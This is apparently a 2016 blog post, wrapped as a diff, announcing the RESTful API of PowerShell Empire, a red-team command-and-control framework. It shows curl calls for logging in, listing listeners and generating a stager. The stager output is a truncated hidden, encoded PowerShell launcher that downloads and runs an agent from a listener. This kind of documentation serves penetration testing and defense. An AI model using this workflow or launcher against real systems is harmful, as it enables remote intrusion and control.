@@ -1,0 +1,118 @@
+<p>This post is part of the ‘<strong>Empire Series</strong>’ with some background and an ongoing list of series posts [<a href="http://www.harmj0y.net/blog/empire/expanding-your-empire/">kept here</a>].</p>
+<p><strong>[tl;dr]</strong> The Empire RESTful API is <a href="https://github.com/PowerShellEmpire/Empire/wiki/RESTful-API">documented here</a> on the Empire GitHub wiki.</p>
+<p>Last week, <a href="http://www.harmj0y.net/blog/empire/empire-1-5/">Empire&#8217;s 1.5 release</a> included a RESTful API implementation which I <a href="https://twitter.com/harmj0y/status/712450382589337600">hinted about previously</a>. This effort was inspired by a conversation with <a href="https://twitter.com/antisnatchor">@antisnatchor</a> from the <a href="https://github.com/beefproject/beef">BeEF project</a> while at the Troopers conference this year- big shoutout to him and <a href="https://twitter.com/carlos_perez">Carlos Perez</a> for inspiration and feedback as the API was being developed. This post (and the code itself) wouldn&#8217;t exist if it wasn&#8217;t for both of your efforts.</p>
+<h2>RESTwut</h2>
+<p>REST stands for &#8216;REpresentational State Transfer&#8217;, and an API can be considered RESTful if conforms to the constraints of REST. <a href="https://en.wikipedia.org/wiki/Representational_state_transfer">According to Wikipedia</a>, &#8220;<em>The name &#8220;Representational State Transfer&#8221; is intended to evoke an image of how a well-designed Web application behaves: a network of web pages (a virtual state-machine), where the user progresses through the application by selecting links (state transitions), resulting in the next page (representing the next state of the application) being transferred to the user and rendered for their use</em>&#8220;. The way I interpret it- it&#8217;s a way to design an API based on HTTP verbs and JSON requests/responses that behaves in a particular way and conforms to a reasonable standard.</p>
+<p>Long story short, there&#8217;s now a method for external users/projects to interact with an established Empire instance in predictable way, controlling all aspects of an Empire control server. Empire’s RESTful API is implemented with <a href="http://flask.pocoo.org/">Flask</a>, inspired by Miguel Grinberg’s <a href="http://blog.miguelgrinberg.com/post/designing-a-restful-api-with-python-and-flask">series of articles</a>. It&#8217;s based on the <a href="https://github.com/beefproject/beef/wiki/BeEF-RESTful-API">token-auth model set forward by BeEF</a> and aims to avoid some of the recent security concerns with the <a href="https://twitter.com/veilframework/status/714942364356218881">Veil-Evasion RPC interface</a> I designed over a year ago. Protip: don&#8217;t design an interface that binds to 0.0.0.0 and lacks any kind of authentication ;)</p>
+<h2>So What?</h2>
+<p>But really, so what? Why spend the time to build this, and why does it matter? What&#8217;s the point?</p>
+<p>By exposing the control of an Empire instance in a predictable fashion, we&#8217;re opening up Empire for integration into other projects. I originally didn&#8217;t think this was a big deal until <a href="https://twitter.com/antisnatchor">@antisnatchor</a> convinced me otherwise, pointing out the what the community had done with Metasploit and BeEF itself. And already the venerable and prolific <a href="https://twitter.com/carlos_perez">Carlos Perez</a> has build a PowerShell Empire controller, <a href="https://gitlab.com/carlos_perez/PowerEmpire">PowerEmpire</a>, with a great quickstart <a href="https://gitlab.com/carlos_perez/PowerEmpire/wikis/home">here</a>. It is now possible to control an Empire server through a pure set of PowerShell modules, meaning you can op from a Windows system without installing Empire itself! <a href="https://twitter.com/antisnatchor">@antisnatchor</a>  also mentioned that Empire will <a href="https://twitter.com/antisnatchor/status/715847469087723521">potentially integrated into BeEF</a> soon.</p>
+<p>So what else is possible? Web front ends, Empire-controlling Android apps, multi-player Empire CLI UIs that managed multiple instances (which we&#8217;re already working on ; ), and anything else the community can think up. We&#8217;re hoping this opens the doors for some awesome new projects.</p>
+<h2>Empire&#8217;s RESTful API Design</h2>
+<p>I spent a chunk of time trying my best to design the API properly, and <a href="https://twitter.com/carlos_perez">Carlos</a> was a huge help in this area. The API was essentially designed in tandem with Carlos&#8217; <a href="https://gitlab.com/carlos_perez/PowerEmpire">PowerShell module</a>, with us going back and forth for a week with design feedback and various tweaks. We&#8217;ve started documenting these efforts for the complete state of the API on the <a href="https://github.com/PowerShellEmpire/Empire/wiki/RESTful-API">Empire GitHub wiki</a>. <strong>Sidenote:</strong> We&#8217;ve also started cloning parts of the <a href="http://www.PowerShellEmpire.com">www.PowerShellEmpire.com</a> site to the <a href="https://github.com/PowerShellEmpire/Empire/wiki">wiki as well</a>. Most of this post section is a mirror the API wiki documentation.</p>
+<p>So, to get started. There are two ways to launch the Empire RESTful API. You can start a normal Empire instance instance with <code>./empire</code>, and then in another windows run <code>./empire --rest</code>. This starts the API without a fully-featured Empire instance, allowing you to still interact with the normal Empire UI. Alternatively, you can run Empire &#8216;headlessly&#8217; with <code>./empire --headless</code>, which will start a complete Empire instance as well as the RESTful API, and will suppress all output except for startup messages. If you want to still interact with a normal Empire UI, launch a <code>--rest</code> instance from another tab, and if you want to run Empire on a remote node without interaction, use the <code>./empire --headless</code>, option.</p>
+<p>By default, the RESTful API is started on port 1337, over HTTPS using the certificate located at ./data/empire.pem (which can be generated with <strong>./setup/cert.sh</strong>). This port can be changed by supplying <code>--restport &lt;PORT_NUM&gt;</code> on launch.</p>
+<p>The default username for the API is &#8217;empireadmin&#8217; and the default password is randomly generated by ./setup/setup_database.py during install. This value is retrievable by using <code>sqlitebrowser ./data/empire.db</code>, or can be modified in the setup_database.py file. You can also manually specify the username and password for a REST/headless launch with <code>--username admin --password &lt;PASSWORD&gt;.</code></p>
+<p>The Empire API uses a simple token-based auth system similar to <a href="https://github.com/beefproject/beef/wiki/BeEF-RESTful-API#authentication">BeEF&#8217;s</a>. In order to make any requests to the API, a <strong>?token=X</strong> parameter must be supplied, otherwise a 403 error is returned. The token is randomly generated on rest API start up and displayed on the command line.</p>
+<pre># ./empire --rest --password 'Password123!'
+
+[*] Loading modules from: /mnt/hgfs/git/github/Empire/lib/modules/
+ * Starting Empire RESTful API on port: 1337
+ * RESTful API token: ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
+ * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)
+</pre>
+<p>To retrieve the session token through the login interface, you can POST a request to</p>
+<p><code>/api/admin/login</code>. Here&#8217;s an example with curl:</p>
+<pre># curl --insecure -i -H "Content-Type: application/json" https://localhost:1337/api/admin/login -X POST -d '{"username":"empireadmin", "password":"Password123!"}'
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 57
+Server: Werkzeug/0.11.4
+Date: Thu, 31 Mar 2016 23:38:59 GMT
+
+{
+  "token": "ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5"
+}
+</pre>
+<p>This token can now be used to request any of the Empire API actions to control nearly every aspect of an Empire instance, from enumeration/starting/killing listeners, to controlling agents, generating stagers, shutting down/restarting the server, and more. All current actions are <a href="https://github.com/PowerShellEmpire/Empire/wiki/RESTful-API">documented here</a>. There&#8217;s also a <a href="https://gist.github.com/HarmJ0y/5b5aadbe694bc0be96c4">gist here</a> that demonstrates some of the common actions. For example, here&#8217;s how to enumerate all the currently running listeners:</p>
+<pre># curl --insecure -i https://localhost:1337/api/listeners?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 556
+Server: Werkzeug/0.11.4
+Date: Fri, 01 Apr 2016 07:40:49 GMT
+
+{
+  "listeners": [
+    {
+      "ID": 1,
+      "cert_path": "",
+      "default_delay": 5,
+      "default_jitter": 0.0,
+      "default_lost_limit": 60,
+      "default_profile": "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+      "host": "http://192.168.52.173:8080",
+      "kill_date": "",
+      "listener_type": "native",
+      "name": "test",
+      "port": 8080,
+      "redirect_target": "",
+      "staging_key": "m@T%...",
+      "working_hours": ""
+    }
+  ]
+}
+</pre>
+<p>And here&#8217;s how to generate a stager for that same listener:</p>
+<pre># curl --insecure -i -H "Content-Type: application/json" https://localhost:1337/api/stagers?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -X POST -d '{"StagerName":"launcher", "Listener":"test"}'
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 2342
+Server: Werkzeug/0.11.4
+Date: Fri, 01 Apr 2016 07:42:56 GMT
+
+{
+  "launcher": {
+    "Base64": {
+      "Description": "Switch. Base64 encode the output.",
+      "Required": true,
+      "Value": "True"
+    },
+    "Listener": {
+      "Description": "Listener to generate stager for.",
+      "Required": true,
+      "Value": "test"
+    },
+    "OutFile": {
+      "Description": "File to output launcher to, otherwise displayed on the screen.",
+      "Required": false,
+      "Value": ""
+    },
+    "Output": "powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOAEUA...TgAnACcAKQA=",
+    "Proxy": {
+      "Description": "Proxy to use for request (default, none, or other).",
+      "Required": false,
+      "Value": "default"
+    },
+    "ProxyCreds": {
+      "Description": "Proxy credentials ([domain\\]username:password) to use for request (default, none, or other).",
+      "Required": false,
+      "Value": "default"
+    },
+    "StagerRetries": {
+      "Description": "Times for the stager to retry connecting.",
+      "Required": false,
+      "Value": "0"
+    },
+    "UserAgent": {
+      "Description": "User-agent string to use for the staging request (default, none, or other).",
+      "Required": false,
+      "Value": "default"
+    }
+  }
+}
+</pre>
+<p>You can see the actual stager information in the <strong>Output</strong> field of the returned JSON. Sidenote: for any stagers that require an <strong>OutFile</strong>, the base64-encoded output file will be returned in the <strong>Output</strong> field.</p>
+<h2>Looking Forward</h2>
+<p>While the API is in a reasonable state, I&#8217;m sure there&#8217;s still work to be done as we&#8217;ve never designed a proper API before- if you have substantial feedback or design concerns let us know! We&#8217;ll integrate appropriate changes and get them pushed out. We want the API to be as standardized and usable by the community as possible, and look forward to what everyone can produce!</p>
+<p>&nbsp;</p>
